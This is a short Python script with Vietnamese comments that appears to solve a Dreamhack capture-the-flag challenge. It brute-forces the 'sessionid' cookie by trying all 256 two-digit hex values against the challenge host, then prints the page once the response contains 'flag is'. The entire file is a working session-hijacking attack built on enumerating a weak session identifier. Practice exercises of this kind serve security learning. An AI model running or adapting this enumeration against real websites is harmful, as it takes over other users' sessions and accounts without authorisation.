import requests

URL = 'http://host8.dreamhack.games:20314/'  # Thay bằng địa chỉ web thật

for i in range(256):
    # format(số, '0Nx')
    # 0	Thêm số 0 vào đầu nếu chuỗi quá ngắn
    # N	Số lượng ký tự tối thiểu bạn muốn
    # x	Chuyển sang hệ thập lục phân (hex), dùng a-f thường
    sid = format(i, '02x')  # Giá trị từ '00' đến 'ff' 
    cookies = {'sessionid': sid}
    res = requests.get(URL, cookies=cookies)
    
    if 'flag is' in res.text:  # Thay bằng chuỗi nhận biết flag
        print(f'[+] FOUND sessionid: {sid}')
        print(res.text)
        break
